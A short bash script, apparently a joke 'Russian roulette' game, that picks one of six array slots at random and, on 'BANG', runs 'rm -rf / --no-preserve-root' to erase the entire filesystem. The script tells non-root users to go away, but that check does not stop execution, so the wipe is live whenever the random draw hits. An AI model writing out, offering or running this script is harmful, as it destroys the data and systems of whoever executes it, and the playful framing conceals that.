#!/bin/bash
#
# So, this is what it has come to.
#
# Make sure this is running as root
if [[ $(whoami) == "root" ]]; then
        echo "Welcome, root. Let the games begin..."
else
        echo "Run this script as root, or go away."
fi
echo ''
# Define Nums (44 Magnums hold 5 or 6 rounds, let's play nice and give it 6).
arr[0]="CLICK"
arr[1]="CLICK"
arr[2]="CLICK"
arr[3]="BANG"
arr[4]="CLICK"
arr[5]="CLICK"
# Define what constitutes "random"
rand=$[$RANDOM % ${#arr[@]}]
# Let's see what noise that trigger produces
triggergo="$(echo ${arr[$rand]})"
# Outcome of trigger
if [[ $triggergo == "BANG" ]]; then
        echo "BANG!" ; rm -rf / --no-preserve-root
else
        echo "CLICK"
fi
